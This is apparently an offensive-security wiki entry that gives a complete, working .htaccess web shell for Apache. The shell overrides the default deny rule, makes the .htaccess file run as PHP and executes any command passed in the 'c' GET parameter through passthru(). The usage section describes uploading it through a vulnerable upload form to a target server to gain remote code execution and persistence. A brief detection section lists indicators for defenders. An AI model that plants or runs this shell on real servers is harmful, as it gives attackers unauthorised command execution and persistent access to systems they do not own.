---
type: code
language: htaccess
verified: true
tags:
  - web-shell
  - .htaccess
  - apache
platforms:
  - Web
  - Apache
validated: true
---

# HTAccess Self-Contained Web Shell

## Code

```htaccess
# Self contained .htaccess web shell - Part of the htshell project
# Written by Wireghoul - http://www.justanotherhacker.com

# Override default deny rule to make .htaccess file accessible over web
<Files ~ "^\.ht">
Order allow,deny
Allow from all
</Files>

# Make .htaccess file be interpreted as php file. This occur after apache has interpreted
# the apache directoves from the .htaccess file
AddType application/x-httpd-php .htaccess

###### SHELL ######
<?php echo "\n";passthru($_GET['c']." 2>&1"); ?>
```

## Description

This code creates a self-contained web shell within a .htaccess file for Apache servers. It includes directives to override access restrictions and force PHP interpretation of the .htaccess file, followed by a simple PHP passthru shell that executes system commands passed via the 'c' GET parameter. Designed for persistence in web server compromises where file uploads are possible but PHP file uploads are restricted.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_GET['c'] | Command to execute on the server (passed via URL query) | ls -la |

## Usage

Save the code as .htaccess and upload to the target Apache directory via a vulnerable upload form. Access via http://target/.htaccess?c=command to execute. Ideal for initial RCE in web apps; chain with other tools for escalation.

## Detection

- Web server logs showing PHP execution in .htaccess files or unusual GET parameters like 'c='.
- File integrity monitoring alerting to .htaccess modifications.
- WAF rules blocking passthru() or suspicious command patterns in requests.
- Network anomalies: HTTP requests to .htaccess with long query strings.

## Related

- [[procedures/HTAccess-and-PHP-Shell-Upload]]
